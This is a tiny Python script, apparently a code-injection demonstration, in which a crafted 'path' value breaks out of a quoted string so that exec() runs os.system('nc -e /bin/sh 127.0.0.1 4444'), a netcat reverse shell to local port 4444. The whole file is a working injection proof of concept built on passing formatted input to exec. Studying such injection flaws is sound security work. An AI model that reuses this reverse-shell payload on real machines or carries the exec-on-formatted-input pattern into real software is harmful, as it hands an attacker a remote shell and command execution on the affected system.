import os

def main():
	
	path="'+ os.system('nc -e /bin/sh 127.0.0.1 4444') +'"
	info = "output = 'Document: {}'"
	exec(info.format(path))
	print(info)
	print(info.format(path))
	




main()
